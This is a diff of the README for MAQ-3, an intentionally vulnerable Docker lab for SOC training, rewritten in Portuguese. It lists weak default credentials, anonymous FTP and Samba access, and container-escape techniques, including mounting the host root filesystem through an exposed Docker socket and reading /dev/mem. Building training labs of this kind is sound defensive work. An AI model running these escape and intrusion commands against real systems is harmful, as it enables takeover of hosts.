@@ -1,233 +1,403 @@
-# MAQ-3 - Linux Debian (Infrastructure/File Server) - Vulnerable Machine
+# MAQ-3 - Laboratório Linux Vulnerável
 
-This machine is part of the Lab and is intentionally vulnerable for cybersecurity training, incident response, and SOC exercises.
+## 🎯 **Visão Geral**
 
----
+MAQ-3 é um laboratório Linux vulnerável configurado para treinamento de SOC (Security Operations Center). O ambiente inclui serviços vulneráveis, logs expostos via volumes Docker, e configurações que permitem escape de container para demonstração de ataques avançados.
 
-## ⚠️ IMPORTANT WARNING
-**This container is intentionally vulnerable!**
-- Do **NOT** use in production environments
-- Do **NOT** expose to the public internet
-- Use **ONLY** in isolated, controlled lab environments
+## 🚀 **Início Rápido**
 
----
+### **1. Deploy Completo**
 
-## 1. Prerequisites
-- Docker and Docker Compose installed
-- At least 4GB RAM available
-- Isolated network environment (lab network)
-- Clone or copy the directory to your lab server
-
----
-
-## 2. How to Start the Vulnerable Machine
-
-### Access the machine directory:
 ```bash
-cd MAQ-3
+# Configurar e executar ambiente completo
+./maquina3-setup.sh deploy
 ```
 
-### Option 1: Using the optimized deploy script (Recommended)
+### **2. Comandos Básicos**
+
 ```bash
-# Build the Docker image with all vulnerabilities configured
-./deploy.sh build
+# Iniciar ambiente existente
+./maquina3-setup.sh start
 
-# Start the container with automatic port detection
-./deploy.sh run
+# Parar ambiente
+./maquina3-setup.sh stop
 
-# Check status and logs
-./deploy.sh status
-./deploy.sh logs
+# Reiniciar ambiente
+./maquina3-setup.sh restart
 
-# Stop the container
-./deploy.sh stop
+# Ver status
+./maquina3-setup.sh status
 
-# Clean everything (containers, images, networks)
-./deploy.sh clean
+# Acessar shell do container
+./maquina3-setup.sh shell
 
-# Full cleanup including Docker system prune
-./deploy.sh clean full
+# Monitorar logs
+./maquina3-setup.sh logs
+
+# Limpar ambiente
+./maquina3-setup.sh clean
 ```
 
-### Option 2: Using Docker Compose (Legacy)
-```bash
-docker-compose up -d --build
+## 🏗️ **Arquitetura**
+
+### **Serviços Expostos**
+
+- **SSH**: Porta 2222 (vulnerável)
+- **FTP**: Porta 2121 (acesso anônimo)
+- **Samba**: Portas 2139, 2445 (acesso público)
+- **Syslog**: Porta 2514
+
+### **Volumes Docker**
+
 ```
-- This will build the image (if needed) and start the container with all vulnerable services.
+logs/
+├── system/          # Logs do sistema
+├── auth/            # Logs de autenticação
+├── ssh/             # Logs SSH
+├── ftp/             # Logs FTP
+├── samba/           # Logs Samba
+├── rsyslog/         # Logs rsyslog
+├── app/             # Logs de aplicação
+├── commands/        # Logs de comandos
+└── debug/           # Logs de debug
 
----
-
-## 3. Managing the Machine
-
-### Using the deploy script (Recommended):
-- **Check if it's running:**
-  ```bash
-  ./deploy.sh status
-  ```
-- **Access the container shell:**
-  ```bash
-  docker exec -it maquina3 bash
-  ```
-- **View logs:**
-  ```bash
-  ./deploy.sh logs
-  ```
-- **Stop the lab machine:**
-  ```bash
-  ./deploy.sh stop
-  ```
-- **Restart the container:**
-  ```bash
-  ./deploy.sh restart
-  ```
-- **Reset the environment (clean everything and rebuild):**
-  ```bash
-  ./deploy.sh clean full
-  ./deploy.sh build
-  ./deploy.sh run
-  ```
-
-### Using Docker commands directly:
-- **Check if it's running:**
-  ```bash
-  docker ps
-  ```
-- **Access the container shell:**
-  ```bash
-  docker exec -it maquina3 bash
-  ```
-- **View logs:**
-  ```bash
-  docker logs -f maquina3
-  ```
-- **Stop the lab machine:**
-  ```bash
-  docker stop maquina3
-  docker rm maquina3
-  ```
-
----
-
-## 4. Student Access (Service Ports)
-
-The deploy script automatically detects port conflicts and uses alternative ports if needed.
-
-### Default Ports (if available):
-- **SSH:**
-  - `ssh -p 22 root@<LAB_SERVER_IP>` (password: `toor`)
-  - `ssh -p 22 ftpuser@<LAB_SERVER_IP>` (password: `password123`)
-- **FTP:**
-  - `ftp <LAB_SERVER_IP> -p 21` (user: anonymous)
-- **Samba:**
-  - `smbclient -L //<LAB_SERVER_IP> -U anonymous`
-  - `smbclient -L //<LAB_SERVER_IP> -U smbuser` (password: password123)
-- **Syslog:**
-  - SIEM tools can collect logs from port 514
-
-### Alternative Ports (if default ports are in use):
-- **SSH:** Port 2222
-- **FTP:** Port 2121
-
-### Check actual ports in use:
-```bash
-./deploy.sh status
+vulnerable_files/    # Arquivos vulneráveis
+ftp_public/          # Arquivos FTP públicos
+samba_public/        # Arquivos Samba públicos
+configs/             # Configurações
+home/                # Diretórios home
 ```
 
+## 🔓 **Vulnerabilidades Configuradas**
+
+### **SSH**
+
+- Chaves RSA fracas (1024 bits)
+- Login root habilitado
+- Senhas fracas conhecidas
+- Permitir senhas vazias
+
+### **FTP**
+
+- Acesso anônimo habilitado
+- Upload anônimo permitido
+- Criação de diretórios anônima
+- Chroot desabilitado
+
+### **Samba**
+
+- Compartilhamento público total
+- Acesso de convidado habilitado
+- Permissões 777 em arquivos
+- Senhas fracas
+
+### **Container**
+
+- Docker socket exposto
+- Proc e Sys montados
+- Capabilities perigosas
+- Modo privilegiado
+
+## 📊 **Logs para Captura**
+
+### **Logs de Sistema**
+
+- `/var/log/syslog` - Logs gerais do sistema
+- `/var/log/auth.log` - Logs de autenticação
+- `/var/log/messages` - Mensagens do sistema
+
+### **Logs de Serviços**
+
+- `/var/log/ssh_credentials.log` - Tentativas SSH
+- `/var/log/commands.log` - Comandos executados
+- `/var/log/debug.log` - Logs de debug
+- `/var/log/app/application.log` - Logs de aplicação
+
+### **Logs de Ataque**
+
+- Tentativas de login SSH
+- Acessos FTP anônimos
+- Conexões Samba
+- Comandos executados
+- Tráfego de rede
+
+## 🎯 **Vetores de Ataque**
+
+### **1. SSH Brute Force**
+
+```bash
+# Testar credenciais conhecidas
+ssh -p 2222 root@localhost
+ssh -p 2222 ftpuser@localhost
+ssh -p 2222 smbuser@localhost
+
+# Credenciais: root:toor, ftpuser:password123, smbuser:password123
+```
+
+### **2. FTP Anônimo**
+
+```bash
+# Acesso anônimo
+ftp localhost 2121
+# Usuário: anonymous
+# Senha: qualquer coisa
+
+# Upload de arquivo
+put /etc/passwd
+```
+
+### **3. Samba Público**
+
+```bash
+# Listar compartilhamentos
+smbclient -L //localhost -U guest -p 2445
+
+# Acessar compartilhamento público
+smbclient //localhost/Public -U guest -p 2445
+```
+
+### **4. Escape de Container**
+
+```bash
+# Acessar Docker socket
+docker ps
+docker exec -it maquina3-soc bash
+
+# Verificar montagens
+mount | grep proc
+mount | grep sys
+```
+
+## 🧪 **Teste de Ataque**
+
+### **Executar Script de Teste**
+
+```bash
+# Executar testes automatizados
+./attack-test.sh
+```
+
+### **Testes Incluídos**
+
+- SSH brute force
+- FTP anônimo
+- Samba público
+- Escape de container
+- Acesso a arquivos sensíveis
+- Geração de tráfego de rede
+
+## 🔍 **Monitoramento**
+
+### **Ver Logs em Tempo Real**
+
+```bash
+# Monitorar todos os logs
+./maquina3-setup.sh logs
+
+# Ou monitorar diretórios específicos
+tail -f logs/*/*.log
+```
+
+### **Logs Importantes**
+
+```bash
+# Logs de autenticação SSH
+tail -f logs/ssh/ssh.log
+
+# Logs de comandos
+tail -f logs/commands/commands.log
+
+# Logs de aplicação
+tail -f logs/app/application.log
+```
+
+## 📈 **Integração com Elastic**
+
+### **Configuração de Logstash**
+
+```yaml
+input {
+  file {
+    path => "/path/to/maq3/logs/*/*.log"
+    type => "maq3-logs"
+    start_position => "beginning"
+  }
+}
+
+filter {
+  if [type] == "maq3-logs" {
+    grok {
+      match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} %{GREEDYDATA:log_message}" }
+    }
+  }
+}
+
+output {
+  elasticsearch {
+    hosts => ["localhost:9200"]
+    index => "maq3-logs-%{+YYYY.MM.dd}"
+  }
+}
+```
+
+### **Padrões de Log**
+
+- **SSH**: Tentativas de login, chaves fracas
+- **FTP**: Acessos anônimos, uploads
+- **Samba**: Conexões, acessos a arquivos
+- **Sistema**: Comandos, processos, rede
+
+## 🛠️ **Troubleshooting**
+
+### **Problemas Comuns**
+
+#### **Container não inicia**
+
+```bash
+# Verificar logs do Docker
+docker-compose logs
+
+# Verificar portas em uso
+netstat -tuln | grep -E "(2121|2222|2445)"
+```
+
+#### **Logs não aparecem**
+
+```bash
+# Verificar volumes
+docker inspect maquina3-soc | grep -A 10 Mounts
+
+# Verificar permissões
+ls -la logs/
+```
+
+#### **Serviços não respondem**
+
+```bash
+# Acessar container
+./maquina3-setup.sh shell
+
+# Verificar status dos serviços
+systemctl status ssh
+systemctl status vsftpd
+systemctl status smbd
+```
+
+## 📚 **Recursos de Aprendizado**
+
+### **Cenários de Treinamento**
+
+1. **Detecção de Brute Force SSH**
+2. **Monitoramento de Acesso FTP Anônimo**
+3. **Análise de Conexões Samba**
+4. **Detecção de Escape de Container**
+5. **Análise de Logs de Comando**
+
+### **Ferramentas Úteis**
+
+- **SSH**: ssh, ssh-keyscan
+- **FTP**: ftp, curl
+- **Samba**: smbclient, nmap
+- **Docker**: docker, docker-compose
+- **Logs**: tail, grep, awk
+
+## ⚠️ **Avisos de Segurança**
+
+- **AMBIENTE DE TREINAMENTO APENAS**
+- Não use em produção
+- Isolado em rede Docker
+- Logs expostos intencionalmente
+- Vulnerabilidades configuradas para demonstração
+
+## 🚀 Técnicas de Escape de Container
+
+O ambiente MAQ-3 foi configurado especificamente para permitir escape de container, demonstrando vulnerabilidades reais de segurança.
+
+### **Vulnerabilidades Configuradas para Escape:**
+
+1. **Docker Socket Exposto** (`/var/run/docker.sock`)
+2. **Container Privilegiado** (`privileged: true`)
+3. **Capabilities Perigosas**:
+   - `SYS_ADMIN` - Montar filesystems
+   - `NET_ADMIN` - Manipular rede
+   - `SYS_PTRACE` - Debugging de processos
+   - `DAC_READ_SEARCH` - Bypass de permissões
+4. **Security Options Desabilitadas**:
+   - `seccomp:unconfined`
+   - `apparmor:unconfined`
+
+### **Script de Demonstração de Escape:**
+
+```bash
+# Acessar o container
+docker exec -it maquina3-soc bash
+
+# Executar demonstração completa
+./container-escape-demo.sh all
+
+# Ou técnicas específicas
+./container-escape-demo.sh docker      # Escape via Docker socket
+./container-escape-demo.sh capabilities # Exploiting capabilities
+./container-escape-demo.sh privileged  # Exploiting privileged mode
+./container-escape-demo.sh proc-sys    # Escape via /proc e /sys
+```
+
+### **Técnicas de Escape Disponíveis:**
+
+#### **1. Docker Socket Escape (Mais Efetivo)**
+```bash
+# Dentro do container
+docker ps                    # Listar containers do host
+docker run --rm -it --privileged -v /:/host ubuntu:latest chroot /host bash
+```
+
+#### **2. Capabilities Exploitation**
+```bash
+# SYS_ADMIN - Montar filesystems
+mount -t proc none /tmp/host_proc
+
+# NET_ADMIN - Manipular rede
+ip link set lo down
+ip addr add 192.168.1.100/24 dev lo
+```
+
+#### **3. Privileged Container**
+```bash
+# Acesso direto à memória do host
+cat /dev/mem | strings | head -100
+
+# Acessar processos do host
+ps aux
+```
+
+#### **4. Proc/Sys Information Gathering**
+```bash
+# Informações do sistema
+cat /proc/version
+cat /proc/sys/kernel/hostname
+ls /proc/net/
+ls /sys/class/net/
+```
+
+### **Comandos Rápidos para Teste:**
+
+```bash
+# Acesso básico ao container
+docker exec -it maquina3-soc bash
+
+# Verificar vulnerabilidades
+ls -la /var/run/docker.sock
+cat /proc/self/status | grep Cap
+mount | grep -E "(proc|sys)"
+
+# Tentar escape direto
+docker run --rm -it --privileged -v /:/host ubuntu:latest chroot /host bash
+```
+
+### **⚠️ AVISO DE SEGURANÇA:**
+
+Este ambiente é **INTENCIONALMENTE VULNERÁVEL** para treinamento. Nunca use estas configurações em produção!
+
 ---
 
-## 5. Services and Vulnerabilities
-
-### Configured Vulnerabilities:
-- **SSH:** Weak RSA key (1024 bits), root login enabled, weak passwords
-- **FTP:** Anonymous access enabled, upload/download allowed, public directory
-- **Samba:** Public share, weak permissions, guest access enabled
-- **Syslog:** Misconfigured, leaks credentials in logs
-- **Sensitive files:** Dumps, scripts, and backups in public locations
-
-### Vulnerable Files and Directories:
-- `/opt/vulnerable_files/dumps/` - Password dumps, database configs
-- `/var/ftp/pub/` - Public FTP directory with sensitive files
-- `/var/samba/public/` - Public Samba share with dumps
-- `/var/log/ssh_credentials.log` - Logs with leaked credentials
-- `/var/log/commands.log` - Command execution logs
-- `/var/log/debug.log` - Debug logs with sensitive information
-
-### Attack Vectors:
-- **SSH Brute Force:** Weak passwords and RSA key
-- **FTP Anonymous Access:** File upload/download capabilities
-- **Samba Enumeration:** Public shares with sensitive data
-- **Log Analysis:** Credential leakage in syslog
-- **File Exfiltration:** Sensitive files accessible via multiple protocols
-
----
-
-## 6. Security Recommendations
-- **Never** expose these ports to the internet
-- Use only in a controlled lab network
-- After each class/session, run `docker-compose down` to reset
-- To restore to the initial state, use:
-  ```bash
-  docker-compose down -v
-  docker-compose up -d --build
-  ```
-
----
-
-## 7. Troubleshooting
-
-### Port Conflicts:
-- The deploy script automatically detects port conflicts and uses alternative ports
-- If you get port binding errors, run:
-  ```bash
-  ./deploy.sh clean full
-  ./deploy.sh run
-  ```
-
-### Container Issues:
-- If the container keeps restarting, check logs:
-  ```bash
-  ./deploy.sh logs
-  ```
-- If you need to update scripts/configurations, rebuild the container:
-  ```bash
-  ./deploy.sh clean
-  ./deploy.sh build
-  ./deploy.sh run
-  ```
-
-### Build Issues:
-- If build fails due to missing packages, ensure you have internet access
-- If SSH key generation fails, the script will retry automatically
-- If user creation fails, the script handles existing users gracefully
-
-### Network Issues:
-- If container can't connect to network, check Docker network:
-  ```bash
-  docker network ls
-  docker network inspect soc-network
-  ```
-
----
-
-## 8. Customization & Replication
-- To create more machines, copy this directory and adapt scripts/configurations as needed
-- Each machine can have its own `docker-compose.yml` and scripts
-- You can orchestrate multiple machines with a root-level `docker-compose.yml` if desired
-
----
-
-## 9. Default Users & Passwords
-- **root:** toor
-- **ftpuser:** password123
-- **smbuser:** password123
-
----
-
-## 10. For Instructors
-- Provide students with the correct IP and port mapping
-- Monitor logs and network activity for detection exercises
-- Reset the environment between classes for a clean start
-
----
-
-**This machine is for educational purposes only. Use responsibly!** 
+**MAQ-3** - Laboratório Linux Vulnerável para Treinamento SOC
